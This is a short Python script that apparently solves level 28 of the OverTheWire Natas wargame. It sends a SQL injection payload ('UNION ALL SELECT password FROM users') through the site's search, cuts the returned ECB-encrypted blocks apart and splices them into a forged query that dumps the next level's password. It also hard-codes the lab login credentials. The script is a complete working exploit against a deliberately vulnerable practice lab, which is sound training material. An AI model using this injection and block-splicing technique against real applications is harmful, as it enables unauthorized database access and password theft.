import requests
import urllib
import base64
# THIS IS FOR LEVEL 28 AND IT WILL GIVE THE ANSWERS FOR THE NATAS29 PASSWORD - 1 method
conn_url = "http://natas28.natas.labs.overthewire.org"
conn = requests.Session()
conn.auth = ('natas28', '1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj')

# First we generate a baseline for the header/footer
data = {'query': 10 * ' '}
resp = conn.post(conn_url, data=data)
meat = urllib.parse.unquote(resp.url.split('=')[1])
meat = base64.b64decode(meat.encode('utf-8'))
header = meat[:48]
footer = meat[48:]

# SQL injection payload
sqli = 9 * " " + "' UNION ALL SELECT password FROM users;#"
data = {'query': sqli}
resp = conn.post(conn_url, data=data)
exploit = urllib.parse.unquote(resp.url.split('=')[1])
exploit = base64.b64decode(exploit.encode('utf-8'))

# Calculating the size of the payload
nblocks = len(sqli) - 10
while nblocks % 16 != 0:
    nblocks += 1
nblocks = int(nblocks / 16)

# Constructing final ciphertext
final = header + exploit[48:(48 + 16 * nblocks)] + footer
final_ciphertext = base64.b64encode(final)

# Sending final request
search_url = "http://natas28.natas.labs.overthewire.org/search.php"
resp = conn.get(search_url, params={"query": final_ciphertext})
print(resp.text)
